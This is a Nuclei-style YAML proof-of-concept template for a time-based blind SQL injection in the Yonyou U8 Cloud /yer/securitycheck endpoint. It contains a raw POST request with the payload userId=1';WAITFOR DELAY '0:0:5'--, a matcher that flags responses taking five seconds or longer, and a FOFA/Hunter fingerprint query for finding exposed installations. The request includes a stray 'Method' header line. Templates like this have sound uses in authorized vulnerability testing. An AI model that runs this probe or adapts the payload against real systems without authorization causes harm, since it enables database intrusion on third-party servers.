id: poc-41539170145d7eb2721c
info:
  name: 用友U8Cloudsecuritycheck存在SQL注入漏洞
  author: hacktwo
  severity: high
  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/41539170145d7eb2721c1dcee0212cc6

    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2025
  metadata:
    source: yuque-hacktwo-dtdx2v
    doc-slug: 41539170145d7eb2721c1dcee0212cc6
    fofa: + hunter`app.name="用友 U8 Cloud"`
http:
- raw:
  - 'POST /yer/securitycheck HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0

    Accept: */*

    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

    Accept-Encoding: gzip, deflate

    Method: POST /yer/core HTTP/1.1

    Content-Type: application/x-www-form-urlencoded;charset=UTF-8

    Content-Length: 12

    Connection: close


    userId=1'';WAITFOR DELAY ''0:0:5''--'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
